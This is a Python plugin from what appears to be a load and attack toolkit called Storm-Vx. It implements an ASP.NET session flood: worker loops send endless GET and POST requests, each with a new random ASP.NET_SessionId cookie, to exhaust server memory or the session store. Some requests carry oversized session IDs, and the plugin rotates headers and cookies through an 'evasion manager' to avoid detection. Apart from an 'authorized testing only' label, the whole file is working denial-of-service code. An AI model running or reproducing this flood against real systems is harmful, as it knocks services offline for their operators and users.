#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_aspnet_session_flood — ASP.NET Session Flood Attack Plugin

Creates a new ASP.NET session for each request by using a different
random ASP.NET_SessionId cookie each time. Each new session forces
the server to allocate memory, create session objects, and potentially
write to SQL session store. 1000 new sessions = 1000 session objects
in server memory. ASP.NET InProc sessions eat RAM fast.
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any
from urllib.parse import urlencode


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str
import aiohttp


__all__ = ["AspnetSessionFloodPlugin"]


class AspnetSessionFloodPlugin(AttackPlugin):
    """ASP.NET session flood — new session per request for memory exhaustion.

    Each request carries a unique ASP.NET_SessionId cookie, forcing the
    server to allocate a new session object per request. With InProc
    session mode, each session consumes server RAM. With StateServer or
    SQLServer mode, each session triggers network/storage writes.

    A mix of GET and POST requests is used to trigger both session
    creation and session write operations. Some requests include
    extremely long session ID values for session ID injection.
    """

    meta = PluginMeta(
        name='aspnet_session_flood',
        version='1.0.0',
        plugin_type='attack',
        description='ASP.NET session flood — new session per request to exhaust server memory (50x)',
        tags=['http', 'aspnet', 'session', 'memory-burn', 'flood'],
        priority=25,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def _generate_session_id(self, inject: bool = False) -> str:
        """Generate a random ASP.NET session ID.

        ASP.NET uses 24-character lowercase hex session IDs by default.
        When inject=True, generates an extremely long value to test
        session ID injection handling.

        Args:
            inject: If True, generate a very long session ID for injection.

        Returns:
            Session ID string.
        """
        if inject:
            # Session ID injection: very long value to test buffer handling
            return rand_str(512)
        # Normal: 24-char lowercase hex (ASP.NET default format)
        return ''.join(random.choices('0123456789abcdef', k=24))

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """ASP.NET session flood worker: new session per request.

        Each iteration sends a request with a unique ASP.NET_SessionId
        cookie value, forcing the server to create a new session. Uses a
        mix of GET and POST requests. Occasional session ID injection
        attempts with oversized cookie values.
        """
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms

        while not self._stop_event.is_set():
            try:
                url = random.choice(pages)

                # Generate a new random session ID for each request
                # Occasionally inject an oversized session ID
                inject = random.random() < 0.05  # 5% injection attempts
                session_id = self._generate_session_id(inject=inject)

                # BUG-007: Use fresh evasion-rotated headers instead of static context.headers
                headers = self._get_fresh_headers(context, "document")

                # BUG-011: Merge cookies instead of overwriting — get existing cookies
                # from evasion manager and append ASP.NET_SessionId
                evasion = context.extra.evasion_manager
                existing_cookies = ""
                if evasion and hasattr(evasion, 'get_cookies'):
                    existing_cookies = "; ".join(
                        f"{k}={v}" for k, v in evasion.get_cookies().items()
                    )
                if existing_cookies:
                    headers["Cookie"] = f"{existing_cookies}; ASP.NET_SessionId={session_id}"
                else:
                    headers["Cookie"] = f"ASP.NET_SessionId={session_id}"

                # Mix GET and POST
                if random.random() > 0.5:
                    # POST with form data to trigger session writes
                    data = urlencode({
                        '__VIEWSTATE': '',
                        '__EVENTVALIDATION': '',
                        f'ctl00$Content${rand_str(6)}': rand_str(20),
                    })
                    headers["Content-Type"] = "application/x-www-form-urlencoded"

                    t = time.time()
                    try:
                        async with context.session.post(
                                url, headers=headers, data=data,
                                ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.time() - t
                            ok = resp.status < 500
                            hint = "inject" if inject else ""
                            await self._record("ASP-SESS", ok, resp.status, rt,
                                               url=url[:60], hint=hint)
                    except asyncio.CancelledError:
                        raise
                    except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                        rt = time.time() - t
                        await self._record("ASP-SESS", False, 0, rt,
                                           err=type(exc).__name__,
                                           url=url[:60])
                else:
                    # GET request — still creates a new session on the server
                    t = time.time()
                    try:
                        async with context.session.get(
                                url, headers=headers,
                                ssl=_ssl, allow_redirects=False) as resp:
                            rt = time.time() - t
                            ok = resp.status < 500
                            hint = "inject" if inject else ""
                            await self._record("ASP-SESS", ok, resp.status, rt,
                                               url=url[:60], hint=hint)
                    except asyncio.CancelledError:
                        raise
                    except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                        rt = time.time() - t
                        await self._record("ASP-SESS", False, 0, rt,
                                           err=type(exc).__name__,
                                           url=url[:60])

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("ASP-SESS", False, 0, 0,
                                   err=type(exc).__name__)
                await asyncio.sleep(0.1)

